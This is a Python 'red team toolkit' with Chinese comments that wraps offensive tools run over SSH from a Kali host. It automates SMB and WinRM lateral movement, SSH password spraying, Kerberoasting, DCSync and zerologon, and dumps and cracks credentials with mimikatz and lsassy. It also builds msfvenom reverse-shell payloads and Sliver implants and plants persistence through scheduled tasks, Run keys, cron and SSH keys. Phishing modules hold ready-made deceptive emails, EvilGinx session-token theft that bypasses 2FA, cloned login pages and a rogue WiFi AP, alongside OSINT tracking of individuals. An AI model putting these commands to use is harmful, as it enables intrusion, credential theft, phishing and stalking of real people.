#!/usr/bin/env python3
"""
Red Team Toolkit — 红队全流程自动化

整合：内网横向、AD域渗透、社工钓鱼、C2对接、权限维持。
所有操作通过 KaliBridge SSH 执行。

用法:
    from kali_bridge import KaliBridge
    from redteam_toolkit import RedTeamToolkit
    kb = KaliBridge(config)
    rt = RedTeamToolkit(kb)
    rt.lateral.psexec("10.0.0.5", "admin", "hash")
    rt.ad.kerberoast("dc01", "corp.local", "user", "pass")
    rt.phish.generate_email("victim@corp.com", "IT")
    rt.creds.mimikatz("10.0.0.5", "admin", "pass")
    rt.c2.msf_listener("10.0.0.1", 4444)
"""

class LateralMovement:
    def __init__(s, kb): s.kb = kb
    def psexec(s, t, u, h, d=""): return s.kb.run(f"impacket-psexec {d+'/' if d else ''}{u}@{t} -hashes :{h} 'whoami'|head -20" if len(h)==32 or ':' in h else f"impacket-psexec {u}:{h}@{t} 'whoami'|head -20")
    def wmiexec(s, t, u, p, cmd="whoami", d=""): return s.kb.run(f"impacket-wmiexec {d+'/' if d else ''}{u}:{p}@{t} '{cmd}'|head -20")
    def winrm(s, t, u, p, cmd="whoami"): return s.kb.run(f"evil-winrm -i {t} -u {u} -p '{p}' -c '{cmd}'|head -20", timeout=30)
    def scan_alive(s, subnet): return s.kb.run(f"nmap -sn {subnet} -oG -|grep Up|awk '{{print $2}}'", timeout=60)
    def scan_smb(s, subnet): return s.kb.run(f"nmap -p 445 --open {subnet} -oG -|grep open|awk '{{print $2}}'", timeout=120)
    def ssh_spray(s, targets, users, passwords):
        t="\\n".join(targets if isinstance(targets,list) else [targets])
        u="\\n".join(users); p="\\n".join(passwords)
        return s.kb.run(f"echo -e '{t}'>/tmp/t.txt&&echo -e '{u}'>/tmp/u.txt&&echo -e '{p}'>/tmp/p.txt&&hydra -L /tmp/u.txt -P /tmp/p.txt -M /tmp/t.txt ssh -t 2 -f|grep success|head -20", timeout=300)

class ADAttack:
    def __init__(s, kb): s.kb = kb
    def kerberoast(s, dc, domain, user, pw): return s.kb.run(f"impacket-GetUserSPNs {domain}/{user}:{pw} -dc-ip {dc} -request", timeout=60)
    def asreproast(s, dc, domain, ufile="/tmp/users.txt"): return s.kb.run(f"impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile {ufile} -no-pass -format hashcat", timeout=60)
    def dcsync(s, dc, domain, user, cred): return s.kb.run(f"impacket-secretsdump {domain}/{user}:{cred}@{dc} -just-dc|head -50", timeout=120)
    def bloodhound(s, dc, domain, u, p): return s.kb.run(f"bloodhound-python -c All -d {domain} -u {u} -p '{p}' -dc {dc} -ns {dc}", timeout=180)
    def enum_users(s, dc): return s.kb.run(f"crackmapexec smb {dc} -u '' -p '' --users|head -50", timeout=60)
    def enum_shares(s, dc, u, p): return s.kb.run(f"crackmapexec smb {dc} -u {u} -p '{p}' --shares", timeout=60)
    def zerologon(s, dc): return s.kb.run(f"crackmapexec smb {dc} -u '' -p '' -M zerologon", timeout=30)

class PhishingKit:
    def __init__(s, kb): s.kb = kb
    def generate_email(s, target, dept="IT", company="公司", body_type="password_reset"):
        templates = {
            "password_reset": {"subject": f"【{company}】密码即将过期", "body": f"尊敬的{dept}部同事：\n\n您的密码将于24小时后过期。请点击链接更新：\n\n[更新密码]({{{{link}}}})\n\n{company} IT部"},
            "document": {"subject": f"【{company}】{dept}部 - 文档待审阅", "body": f"Hi，\n\n{dept}部分享了文档给您：\n\n[查看文档]({{{{link}}}})\n\n请今日内查看。"},
            "security": {"subject": f"【安全警告】异常登录 - {company}", "body": f"检测到异常登录。如非本人操作：\n\n[立即处理]({{{{link}}}})\n\n{company} 安全团队"},
        }
        t = templates.get(body_type, templates["password_reset"])
        return {"to": target, **t, "note": "替换{{link}}为钓鱼页面"}
    def gen_payload(s, lhost, lport=4444, fmt="hta"):
        fmts = {"hta":"hta-psh","exe":"exe","ps1":"psh","macro":"vba-psh","elf":"elf"}
        f = fmts.get(fmt, "hta-psh")
        p = "windows/meterpreter/reverse_tcp" if fmt != "elf" else "linux/x64/meterpreter/reverse_tcp"
        return s.kb.run(f"msfvenom -p {p} LHOST={lhost} LPORT={lport} -f {f} -o /tmp/payload.{fmt}", timeout=60)
    def clone_page(s, url): return s.kb.run(f"wget --mirror --convert-links -P /tmp/phish {url}|tail -5", timeout=60)

class CredHarvest:
    def __init__(s, kb): s.kb = kb
    def mimikatz(s, t, u, p): return s.kb.run(f"crackmapexec smb {t} -u {u} -p '{p}' -M mimikatz|head -30", timeout=60)
    def hashdump(s, t, u, p): return s.kb.run(f"impacket-secretsdump {u}:{p}@{t}|head -30", timeout=60)
    def lsass(s, t, u, p): return s.kb.run(f"crackmapexec smb {t} -u {u} -p '{p}' -M lsassy|head -30", timeout=60)
    def crack(s, hfile, wl="/usr/share/wordlists/rockyou.txt", mode=1000): return s.kb.run(f"hashcat -m {mode} {hfile} {wl} --force|tail -20", timeout=600)

class C2Integration:
    def __init__(s, kb): s.kb = kb
    def msf_listener(s, lhost, lport=4444, payload="windows/meterpreter/reverse_tcp"):
        return s.kb.run(f'msfconsole -qx "use multi/handler;set payload {payload};set LHOST {lhost};set LPORT {lport};exploit -j"|tail -10', timeout=30)
    def sliver_gen(s, lhost, lport=443, os_t="windows"):
        return s.kb.run(f"sliver-client generate --mtls {lhost}:{lport} --os {os_t} --save /tmp/implant", timeout=120)
    def sliver_listen(s, lhost, lport=443):
        return s.kb.run(f"sliver-client mtls -l {lhost} -L {lport}", timeout=10)

class Persistence:
    def __init__(s, kb): s.kb = kb
    def schtask(s, t, u, p, name="Update", exe="c:\\\\temp\\\\p.exe"):
        return s.kb.run(f'impacket-atexec {u}:{p}@{t} "schtasks /create /tn {name} /tr {exe} /sc minute /mo 30 /ru SYSTEM"', timeout=30)
    def registry(s, t, u, p, exe="c:\\\\temp\\\\p.exe"):
        return s.kb.run(f'impacket-wmiexec {u}:{p}@{t} \'reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Upd /d "{exe}" /f\'', timeout=30)
    def cron(s, t, u, p, cmd="/tmp/p", sched="*/30 * * * *"):
        return s.kb.run(f"sshpass -p '{p}' ssh {u}@{t} '(crontab -l;echo \"{sched} {cmd}\")|crontab -'", timeout=15)
    def ssh_key(s, t, u, p):
        key = s.kb.run("cat ~/.ssh/id_rsa.pub").get("output","").strip()
        return s.kb.run(f"sshpass -p '{p}' ssh {u}@{t} 'mkdir -p ~/.ssh&&echo \"{key}\">>~/.ssh/authorized_keys'", timeout=15)

class RedTeamToolkit:
    def __init__(s, kb, config=None):
        s.kb = kb; s.config = config or {}
        s.lateral = LateralMovement(kb)
        s.ad = ADAttack(kb)
        s.phish = PhishingKit(kb)
        s.creds = CredHarvest(kb)
        s.c2 = C2Integration(kb)
        s.persist = Persistence(kb)
        # 社工增强
        s.osint = OSINTRecon(kb)
        s.gophish = GoPhishManager(kb)
        s.evilginx = EvilGinxManager(kb)
        s.set = SETManager(kb)
        # OSINT 深度
        s.usernames = UsernameStalker(kb)
        s.phone = PhoneOSINT(kb)
        s.email_osint = EmailOSINT(kb)
        s.zphisher = ZphisherKit(kb)
        s.recon = AdvancedRecon(kb)

    def hw_chain(s, subnet, dc="", domain="", user="", pw=""):
        """HW一条龙: 扫描→喷洒→横向→域控"""
        r = []
        r.append(("存活", s.lateral.scan_alive(subnet)))
        r.append(("SMB", s.lateral.scan_smb(subnet)))
        if user and pw:
            r.append(("CME", s.kb.crackmapexec(subnet, "smb", user, pw)))
            if dc and domain:
                r.append(("Kerberoast", s.ad.kerberoast(dc, domain, user, pw)))
        return r

    def social_engineering_chain(s, target_domain, company_name=""):
        """社工一条龙: 信息收集→邮箱列表→钓鱼模板→部署"""
        r = []
        # Step 1: 收集目标信息
        r.append(("信息收集", s.osint.theharvester(target_domain)))
        r.append(("WHOIS", s.osint.whois_info(target_domain)))
        r.append(("DNS", s.osint.dns_enum(target_domain)))
        # Step 2: 生成钓鱼材料
        company = company_name or target_domain.split(".")[0]
        r.append(("邮件模板_密码", s.phish.generate_email(f"hr@{target_domain}", "HR", company, "password_reset")))
        r.append(("邮件模板_文档", s.phish.generate_email(f"all@{target_domain}", "全员", company, "document")))
        r.append(("邮件模板_安全", s.phish.generate_email(f"admin@{target_domain}", "IT", company, "security")))
        # Step 3: GitHub dork
        r.append(("GitHub泄露", s.osint.github_dorks(target_domain.split(".")[0])))
        return r



# ═══════════════════════════════════════════════════════════
# 社工增强模块 — GoPhish / theHarvester / EvilGinx2 / SET
# ═══════════════════════════════════════════════════════════

class OSINTRecon:
    """开源情报收集 — 目标人员/邮箱/组织信息"""
    def __init__(s, kb): s.kb = kb

    def theharvester(s, domain, sources="bing,google,linkedin,dnsdumpster"):
        """theHarvester: 收集邮箱/子域/员工姓名"""
        return s.kb.run(f"theHarvester -d {domain} -b {sources} -l 200 2>&1|tail -60", timeout=180)

    def linkedin_users(s, company):
        """从LinkedIn搜索目标公司员工（需搭配代理）"""
        return s.kb.run(f"theHarvester -d {company} -b linkedin -l 100 2>&1|grep '@'|head -30", timeout=120)

    def email_format(s, domain):
        """猜测邮箱格式: first.last / f.last / firstlast"""
        return s.kb.run(f"theHarvester -d {domain} -b bing,google -l 50 2>&1|grep '@{domain}'|head -20", timeout=60)

    def hunter_io(s, domain, api_key=""):
        """Hunter.io API 查邮箱（需要 API Key）"""
        if not api_key: return {"error": "需要 HUNTER_IO_API_KEY"}
        return s.kb.run(f"curl -s 'https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}'|python3 -m json.tool|head -50", timeout=15)

    def github_dorks(s, org):
        """GitHub Dork: 找组织泄露的密码/密钥/配置"""
        dorks = [
            f'org:{org} password', f'org:{org} secret', f'org:{org} api_key',
            f'org:{org} token', f'org:{org} jdbc', f'org:{org} smtp',
        ]
        return {"dorks": dorks, "note": "手动在 GitHub 搜索以上关键词"}

    def whois_info(s, domain):
        return s.kb.run(f"whois {domain}|grep -i 'name\\|email\\|phone\\|org'|head -15", timeout=15)

    def dns_enum(s, domain):
        return s.kb.run(f"dig {domain} any +short && dig {domain} mx +short && dig {domain} txt +short", timeout=15)


class GoPhishManager:
    """GoPhish 钓鱼平台管理"""
    def __init__(s, kb): s.kb = kb

    def install(s):
        """安装 GoPhish 到 Kali"""
        return s.kb.run(
            "cd /opt && wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip "
            "&& unzip -oq gophish-*.zip -d gophish && chmod +x /opt/gophish/gophish && echo OK",
            timeout=120
        )

    def start(s, listen_url="0.0.0.0:3333"):
        """启动 GoPhish（后台运行）"""
        return s.kb.run(f"cd /opt/gophish && nohup ./gophish > /tmp/gophish.log 2>&1 &; sleep 3 && cat /tmp/gophish.log|grep password|head -3", timeout=15)

    def status(s):
        """检查 GoPhish 是否运行"""
        return s.kb.run("curl -sk https://localhost:3333/api/ 2>&1|head -5", timeout=10)

    def create_campaign_guide(s, target_domain, from_email, landing_page):
        """生成创建 campaign 的步骤指南"""
        return {
            "steps": [
                f"1. 访问 https://Kali-IP:3333 登录 GoPhish 管理面板",
                f"2. Sending Profile: SMTP 配置（用你的邮件服务器）",
                f"3. Landing Page: 导入 {landing_page} (克隆的登录页)",
                f"4. Email Template: 使用 rt.phish.generate_email() 生成的模板",
                f"5. Users & Groups: 导入从 theHarvester 收集的邮箱列表",
                f"6. Campaign: 组合以上配置，设定发送时间",
                f"7. 查看 Dashboard: 谁打开了/谁点了链接/谁输了密码",
            ],
            "api_example": f"curl -sk https://localhost:3333/api/campaigns -H 'Authorization: Bearer API_KEY'",
        }


class EvilGinxManager:
    """EvilGinx2 — 中间人钓鱼（绕过2FA！）"""
    def __init__(s, kb): s.kb = kb

    def install(s):
        """安装 EvilGinx2"""
        return s.kb.run(
            "go install github.com/kgretzky/evilginx2@latest 2>&1|tail -5",
            timeout=180
        )

    def setup_phishlet(s, phishlet, domain, redirect_url):
        """配置一个 phishlet（如 outlook365、google 等）
        phishlet: o365 / google / linkedin / github
        domain: 你控制的钓鱼域名
        """
        cmds = [
            f"config domain {domain}",
            f"config ipv4 $(curl -s ifconfig.me)",
            f"phishlets hostname {phishlet} {phishlet}.{domain}",
            f"phishlets enable {phishlet}",
            f"lures create {phishlet}",
            f"lures edit 0 redirect_url {redirect_url}",
            f"lures get-url 0",
        ]
        return {
            "commands": cmds,
            "run_command": f"evilginx2 -p /opt/evilginx2/phishlets",
            "note": "EvilGinx2 需要一个域名指向你的服务器 + 配置DNS",
            "支持的phishlet": ["o365", "google", "linkedin", "github", "okta", "onelogin"],
            "效果": "受害者在你的页面登录 → 你拿到完整 session token（绕过2FA）",
        }

    def list_phishlets(s):
        return s.kb.run("ls /opt/evilginx2/phishlets/ 2>/dev/null || ls ~/go/bin/phishlets/ 2>/dev/null", timeout=5)


class SETManager:
    """Social Engineering Toolkit (SET) — Kali 自带"""
    def __init__(s, kb): s.kb = kb

    def credential_harvester(s, clone_url):
        """SET 凭证收割: 克隆目标登录页，受害者输密码你收到"""
        return s.kb.run(
            f"setoolkit <<< $'1\\n2\\n3\\n2\\n{clone_url}\\n' 2>&1|tail -20",
            timeout=30
        )

    def infectious_media(s, lhost, lport=4444):
        """SET 生成恶意USB payload"""
        return s.kb.run(
            f"setoolkit <<< $'1\\n3\\n1\\n{lhost}\\n{lport}\\n' 2>&1|tail -20",
            timeout=30
        )

    def qr_attack(s, url):
        """生成恶意二维码"""
        return s.kb.run(f"qrencode -o /tmp/evil_qr.png '{url}' && echo 'QR saved: /tmp/evil_qr.png'", timeout=10)

    def wifi_ap(s, interface="wlan0", ssid="Free_WiFi"):
        """创建钓鱼 WiFi 热点（需要无线网卡）"""
        return s.kb.run(
            f"airbase-ng -e '{ssid}' -c 6 {interface} 2>&1 &; sleep 3 && echo 'AP started: {ssid}'",
            timeout=15
        )



# ═══════════════════════════════════════════════════════════
# OSINT 增强 — Sherlock/Maigret/PhoneInfoga/Holehe/Zphisher
# ═══════════════════════════════════════════════════════════

class UsernameStalker:
    """用户名跨平台追踪"""
    def __init__(s, kb): s.kb = kb
    def sherlock(s, username):
        return s.kb.run(f"sherlock {username} --print-found 2>&1|head -60", timeout=120)
    def maigret(s, username):
        return s.kb.run(f"maigret {username} --no-color 2>&1|head -80", timeout=180)
    def install_all(s):
        return s.kb.run("pip3 install sherlock-project maigret 2>&1|tail -5", timeout=120)

class PhoneOSINT:
    """手机号情报"""
    def __init__(s, kb): s.kb = kb
    def scan(s, phone):
        return s.kb.run(f"phoneinfoga scan -n {phone} 2>&1|head -40", timeout=30)
    def install(s):
        return s.kb.run("curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install|bash 2>&1|tail -5", timeout=60)

class EmailOSINT:
    """邮箱情报"""
    def __init__(s, kb): s.kb = kb
    def holehe(s, email):
        return s.kb.run(f"holehe {email} --no-color 2>&1|grep '\\[+\\]'|head -30", timeout=60)
    def check_breach(s, email):
        return s.kb.run(f"curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/{email}' -H 'User-Agent:BaiAgent'|head -20", timeout=15)
    def install(s):
        return s.kb.run("pip3 install holehe 2>&1|tail -3", timeout=60)

class ZphisherKit:
    """30+ 钓鱼模板一键生成"""
    def __init__(s, kb): s.kb = kb
    def install(s):
        return s.kb.run("cd /opt && git clone --depth 1 https://github.com/htr-tech/zphisher 2>&1|tail -3", timeout=60)
    def list_templates(s):
        return s.kb.run("ls /opt/zphisher/.sites/ 2>/dev/null||echo 'not installed'", timeout=5)
    def templates(s):
        return ["facebook","instagram","google","microsoft","twitter","github","steam","netflix","paypal","linkedin","wordpress","discord","tiktok","snapchat","yahoo","twitch","xbox","spotify","adobe","vk"]

class AdvancedRecon:
    """综合人员/公司侦察"""
    def __init__(s, kb): s.kb = kb
    def full_person(s, username="", email="", phone=""):
        r = {}
        if username: r["accounts"] = s.kb.run(f"sherlock {username} --print-found 2>&1|head -30", timeout=120)
        if email: r["sites"] = s.kb.run(f"holehe {email} --no-color 2>&1|grep '\\[+\\]'|head -20", timeout=60)
        if phone: r["phone"] = s.kb.run(f"phoneinfoga scan -n {phone} 2>&1|head -20", timeout=30)
        return r
    def full_company(s, domain):
        return {"harvest": s.kb.run(f"theHarvester -d {domain} -b bing,google,linkedin -l 100 2>&1|tail -40", timeout=120),
                "whois": s.kb.run(f"whois {domain}|grep -i 'name\\|email\\|phone'|head -10", timeout=15),
                "dns": s.kb.run(f"dig {domain} any +short", timeout=10)}
